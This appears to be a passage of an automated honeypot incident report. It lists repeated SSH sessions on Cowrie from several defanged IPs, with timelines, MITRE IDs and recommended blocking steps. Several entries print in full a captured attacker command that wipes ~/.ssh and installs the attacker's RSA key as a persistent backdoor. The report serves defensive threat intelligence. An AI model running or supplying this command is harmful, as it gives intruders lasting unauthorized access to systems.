| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:22 |
| **Last Seen** | 2026-05-23 18:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:22:35` | `cowrie.session.connect` |
| `2026-05-23 18:22:35` | `cowrie.client.version` |
| `2026-05-23 18:22:36` | `cowrie.client.kex` |
| `2026-05-23 18:22:36` | `cowrie.login.success` |
| `2026-05-23 18:22:36` | `cowrie.session.params` |
| `2026-05-23 18:22:36` | `cowrie.command.input` |
| `2026-05-23 18:22:36` | `cowrie.command.failed` |
| `2026-05-23 18:22:37` | `cowrie.log.closed` |
| `2026-05-23 18:22:37` | `cowrie.session.params` |
| `2026-05-23 18:22:37` | `cowrie.command.input` |
| `2026-05-23 18:22:37` | `cowrie.session.file_download` |
| `2026-05-23 18:22:37` | `cowrie.log.closed` |
| `2026-05-23 18:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0083d9dd3a0c

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:22 |
| **Last Seen** | 2026-05-23 18:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:22:40` | `cowrie.session.connect` |
| `2026-05-23 18:22:40` | `cowrie.client.version` |
| `2026-05-23 18:22:40` | `cowrie.client.kex` |
| `2026-05-23 18:22:41` | `cowrie.login.success` |
| `2026-05-23 18:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3d8c091096b

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:26 |
| **Last Seen** | 2026-05-23 18:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:26:42` | `cowrie.session.connect` |
| `2026-05-23 18:26:42` | `cowrie.client.version` |
| `2026-05-23 18:26:42` | `cowrie.client.kex` |
| `2026-05-23 18:26:43` | `cowrie.login.success` |
| `2026-05-23 18:26:43` | `cowrie.session.params` |
| `2026-05-23 18:26:43` | `cowrie.command.input` |
| `2026-05-23 18:26:43` | `cowrie.command.failed` |
| `2026-05-23 18:26:43` | `cowrie.log.closed` |
| `2026-05-23 18:26:43` | `cowrie.session.params` |
| `2026-05-23 18:26:43` | `cowrie.command.input` |
| `2026-05-23 18:26:44` | `cowrie.session.file_download` |
| `2026-05-23 18:26:44` | `cowrie.log.closed` |
| `2026-05-23 18:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bca8b644d4f6

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:26 |
| **Last Seen** | 2026-05-23 18:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:26:49` | `cowrie.session.connect` |
| `2026-05-23 18:26:49` | `cowrie.client.version` |
| `2026-05-23 18:26:49` | `cowrie.client.kex` |
| `2026-05-23 18:26:49` | `cowrie.login.success` |
| `2026-05-23 18:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c00a3d20bf6

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:30 |
| **Last Seen** | 2026-05-23 18:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:30:47` | `cowrie.session.connect` |
| `2026-05-23 18:30:47` | `cowrie.client.version` |
| `2026-05-23 18:30:47` | `cowrie.client.kex` |
| `2026-05-23 18:30:48` | `cowrie.login.success` |
| `2026-05-23 18:30:48` | `cowrie.session.params` |
| `2026-05-23 18:30:48` | `cowrie.command.input` |
| `2026-05-23 18:30:48` | `cowrie.command.failed` |
| `2026-05-23 18:30:48` | `cowrie.log.closed` |
| `2026-05-23 18:30:49` | `cowrie.session.params` |
| `2026-05-23 18:30:49` | `cowrie.command.input` |
| `2026-05-23 18:30:49` | `cowrie.session.file_download` |
| `2026-05-23 18:30:49` | `cowrie.log.closed` |
| `2026-05-23 18:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c49f79ec4b8e

| Field | Detail |
|---|---|
| **Source IP** | `197.44.15[.]210` |
| **First Seen** | 2026-05-23 18:30 |
| **Last Seen** | 2026-05-23 18:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:30:52` | `cowrie.session.connect` |
| `2026-05-23 18:30:52` | `cowrie.client.version` |
| `2026-05-23 18:30:52` | `cowrie.client.kex` |
| `2026-05-23 18:30:53` | `cowrie.login.success` |
| `2026-05-23 18:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.44.15[.]210` to AbuseIPDB if not already reported
- [ ] Block `197.44.15[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c79e7856e45b

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:34 |
| **Last Seen** | 2026-05-23 18:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:34:17` | `cowrie.session.connect` |
| `2026-05-23 18:34:17` | `cowrie.client.version` |
| `2026-05-23 18:34:17` | `cowrie.client.kex` |
| `2026-05-23 18:34:18` | `cowrie.login.success` |
| `2026-05-23 18:34:19` | `cowrie.session.params` |
| `2026-05-23 18:34:19` | `cowrie.command.input` |
| `2026-05-23 18:34:19` | `cowrie.command.failed` |
| `2026-05-23 18:34:20` | `cowrie.log.closed` |
| `2026-05-23 18:34:20` | `cowrie.session.params` |
| `2026-05-23 18:34:20` | `cowrie.command.input` |
| `2026-05-23 18:34:20` | `cowrie.session.file_download` |
| `2026-05-23 18:34:20` | `cowrie.log.closed` |
| `2026-05-23 18:34:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69148abd7c2c

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:34 |
| **Last Seen** | 2026-05-23 18:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:34:23` | `cowrie.session.connect` |
| `2026-05-23 18:34:23` | `cowrie.client.version` |
| `2026-05-23 18:34:24` | `cowrie.client.kex` |
| `2026-05-23 18:34:25` | `cowrie.login.success` |
| `2026-05-23 18:34:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6fc902ebc69

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:34 |
| **Last Seen** | 2026-05-23 18:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:34:50` | `cowrie.session.connect` |
| `2026-05-23 18:34:50` | `cowrie.client.version` |
| `2026-05-23 18:34:50` | `cowrie.client.kex` |
| `2026-05-23 18:34:50` | `cowrie.login.success` |
| `2026-05-23 18:34:51` | `cowrie.session.params` |
| `2026-05-23 18:34:51` | `cowrie.command.input` |
| `2026-05-23 18:34:51` | `cowrie.command.failed` |
| `2026-05-23 18:34:51` | `cowrie.log.closed` |
| `2026-05-23 18:34:51` | `cowrie.session.params` |
| `2026-05-23 18:34:51` | `cowrie.command.input` |
| `2026-05-23 18:34:51` | `cowrie.session.file_download` |
| `2026-05-23 18:34:51` | `cowrie.log.closed` |
| `2026-05-23 18:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80ef28729ad8

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:34 |
| **Last Seen** | 2026-05-23 18:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:34:53` | `cowrie.session.connect` |
| `2026-05-23 18:34:53` | `cowrie.client.version` |
| `2026-05-23 18:34:53` | `cowrie.client.kex` |
| `2026-05-23 18:34:53` | `cowrie.login.success` |
| `2026-05-23 18:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-610f3e48b76c

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:38 |
| **Last Seen** | 2026-05-23 18:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:38:27` | `cowrie.session.connect` |
| `2026-05-23 18:38:27` | `cowrie.client.version` |
| `2026-05-23 18:38:28` | `cowrie.client.kex` |
| `2026-05-23 18:38:29` | `cowrie.login.success` |
| `2026-05-23 18:38:29` | `cowrie.session.params` |
| `2026-05-23 18:38:29` | `cowrie.command.input` |
| `2026-05-23 18:38:29` | `cowrie.command.failed` |
| `2026-05-23 18:38:30` | `cowrie.log.closed` |
| `2026-05-23 18:38:30` | `cowrie.session.params` |
| `2026-05-23 18:38:30` | `cowrie.command.input` |
| `2026-05-23 18:38:31` | `cowrie.session.file_download` |
| `2026-05-23 18:38:31` | `cowrie.log.closed` |
| `2026-05-23 18:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e8dfea1d0c8

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:38 |
| **Last Seen** | 2026-05-23 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:38:34` | `cowrie.session.connect` |
| `2026-05-23 18:38:34` | `cowrie.client.version` |
| `2026-05-23 18:38:34` | `cowrie.client.kex` |
| `2026-05-23 18:38:35` | `cowrie.login.success` |
| `2026-05-23 18:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3659664f6806

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:42 |
| **Last Seen** | 2026-05-23 18:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:42:30` | `cowrie.session.connect` |
| `2026-05-23 18:42:30` | `cowrie.client.version` |
| `2026-05-23 18:42:30` | `cowrie.client.kex` |
| `2026-05-23 18:42:31` | `cowrie.login.success` |
| `2026-05-23 18:42:32` | `cowrie.session.params` |
| `2026-05-23 18:42:32` | `cowrie.command.input` |
| `2026-05-23 18:42:32` | `cowrie.command.failed` |
| `2026-05-23 18:42:32` | `cowrie.log.closed` |
| `2026-05-23 18:42:33` | `cowrie.session.params` |
| `2026-05-23 18:42:33` | `cowrie.command.input` |
| `2026-05-23 18:42:33` | `cowrie.session.file_download` |
| `2026-05-23 18:42:33` | `cowrie.log.closed` |
| `2026-05-23 18:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d086c1d83ec2

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-23 18:42 |
| **Last Seen** | 2026-05-23 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:42:36` | `cowrie.session.connect` |
| `2026-05-23 18:42:36` | `cowrie.client.version` |
| `2026-05-23 18:42:36` | `cowrie.client.kex` |
| `2026-05-23 18:42:37` | `cowrie.login.success` |
| `2026-05-23 18:42:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7b45c016af1

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:58 |
| **Last Seen** | 2026-05-23 18:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:58:07` | `cowrie.session.connect` |
| `2026-05-23 18:58:07` | `cowrie.client.version` |
| `2026-05-23 18:58:07` | `cowrie.client.kex` |
| `2026-05-23 18:58:07` | `cowrie.login.success` |
| `2026-05-23 18:58:07` | `cowrie.session.params` |
| `2026-05-23 18:58:07` | `cowrie.command.input` |
| `2026-05-23 18:58:07` | `cowrie.command.failed` |
| `2026-05-23 18:58:08` | `cowrie.log.closed` |
| `2026-05-23 18:58:08` | `cowrie.session.params` |
| `2026-05-23 18:58:08` | `cowrie.command.input` |
| `2026-05-23 18:58:08` | `cowrie.session.file_download` |
| `2026-05-23 18:58:08` | `cowrie.log.closed` |
| `2026-05-23 18:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79a5be6a26c3

| Field | Detail |
|---|---|
| **Source IP** | `103.118.82[.]254` |
| **First Seen** | 2026-05-23 18:58 |
| **Last Seen** | 2026-05-23 18:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 18:58:10` | `cowrie.session.connect` |
| `2026-05-23 18:58:10` | `cowrie.client.version` |
| `2026-05-23 18:58:10` | `cowrie.client.kex` |
| `2026-05-23 18:58:10` | `cowrie.login.success` |
| `2026-05-23 18:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.118.82[.]254` to AbuseIPDB if not already reported
- [ ] Block `103.118.82[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97bbd70b5598

| Field | Detail |
|---|---|
| **Source IP** | `177.87.110[.]141` |
| **First Seen** | 2026-05-23 19:12 |
| **Last Seen** | 2026-05-23 19:12 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 19:12:45` | `cowrie.session.connect` |
